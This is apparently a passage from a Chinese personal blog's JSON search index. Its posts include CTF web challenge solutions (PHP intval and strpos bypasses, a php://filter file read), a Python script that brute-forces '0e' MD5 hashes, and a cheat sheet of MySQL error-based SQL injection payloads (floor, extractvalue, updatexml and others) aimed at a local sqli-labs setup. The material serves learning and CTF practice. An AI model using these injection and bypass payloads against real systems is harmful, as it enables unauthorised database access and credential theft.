“0”)查找$num中的0首次出现的位置，并返回位置值，如果0在首位，或不存在0，都会返回false，即0，所以要加0\n所以直接用浮点型\nnum=4476.10\n\n也可以换行\n\n95include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\nnum&#x3D;%20010574\n用空格占住第一个位置，所以0就不是首位了\n\n96highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123;    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;&#125;\n\n?u=/var/www/html/flag.php?u=./flag.php?u=php://filter/read=convert.base64-encode/resource=flag.php\n\n\n97","categories":["CTF"],"tags":["web"]},{"title":"md5脚本","url":"/2024/04/05/md5%E8%84%9A%E6%9C%AC/","content":"import randomimport hashlibdef generate_random_string(length=10):    characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;    random_string = &quot;&quot;    for i in range(length):        random_string += characters[random.randint(0, len(characters) - 1)]    return random_stringinput_str = &quot;&quot;hash_value = &quot;&quot;while True:    input_str = &quot;Warm up&quot; + generate_random_string()    hash_value = hashlib.md5(input_str.encode(&#x27;utf-8&#x27;)).hexdigest()    if hash_value[:2] == &#x27;0e&#x27;:        breakprint(f&quot;输入: &#123;input_str&#125;&quot;)print(f&quot;哈希值: &#123;hash_value&#125;&quot;)def generate_random_string(length=10):    characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;    random_string = &quot;&quot;    for i in range(length):        random_string += characters[random.randint(0, len(characters) - 1)]    return random_string\n\n这个脚本就是爆破以“warm up”开头的字符串且其md5值以0e开头，以什么开头可以自己修改，主要用于ctf比赛中php md5比较\n","categories":["CTF"],"tags":["md5"]},{"title":"my_first_blog","url":"/2024/03/29/my-first-blog/","content":"第一次搭建博客，前前后后不知道用了多长时间，之前一段时间就开始搭建了，但是不知道什么原因网页没有渲染，于是就丢下了这个，最近又重新开始了，在尝试很长时间后，终于给弄出来了，太不容易了，哈哈！\n","categories":["Example"],"tags":["words first"]},{"title":"报错注入","url":"/2024/03/30/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","content":"1.floor函数注入  select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a); http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ union select 1,count(),concat((floor(rand(0)*2)),’–’,(select concat(id,’-‘,username,’-‘,password) from security.users limit 0,1))x from information_schema.tables group by x%23 –SQL注入：floor报错注入的形成原理分析_floor 报错注入-CSDN博客\n\npayload是在中间concat部分，修改该部分可以执行不同命令\n只能用concat连接 ，group_concat不行，且每次只能显示一条数据\n要让上述的报错实现，数据库至少要3条数据\n使用注意\n运用\ncount():查询数量\nrand()：产生0~1间的随机数\nfloor()：向下取整\ngroup by：按指定分类\n函数介绍\n写法\n\n2.extractvalue函数注入\n\n使用注意\nMySQL 5.1.5版本以上才支持该函数\n返回的数据限制为32位\n可以用substring函数进行数据位移偏转 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (extractvalue(1,concat(0x7e,(select substring(group_concat(username),1) from users),0x7e)))–+\n对XML文档进行查询\nEXTRACTVALUE (XML_document, XPath_string);\n第一个参数：XML_document是String格式，为XML文档对象的名称\n第二个参数：XPath_string (Xpath格式的字符串)\n作用：从目标XML中返回包含所查询值的字符串\n函数介绍\n写法 select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n运用 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e)))–+\n\n3.updatexml函数注入\n\nMySQL 5.1.5版本以上才支持该函数\n返回的数据限制为32位\n可以用substring函数进行数据位移偏转\n使用注意\n对XML文档进行修改\nUPDATEXML (XML_document, XPath_string, new_value);\n第一个参数：XML_document是String格式，为XML文档对象的名称\n第二个参数：XPath_string (Xpath格式的字符串)\n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n作用：改变文档中符合条件的节点的值\n函数介绍\n写法 select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n运用 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (updatexml(1,concat(0x7e,(select SUBSTRING(group_concat(username),12) from users),0x7e),1))–+\n\n4.geometrycollection函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n5.multipoint函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n6.polygon函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n7.multipolygon函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n8.linestring函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n9.multilinestring函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n10.exp函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and exp(~(select * from(select user())a));\n运用\n使用注意\n\n","categories":["CTF"],"tags":["sql注入"]}]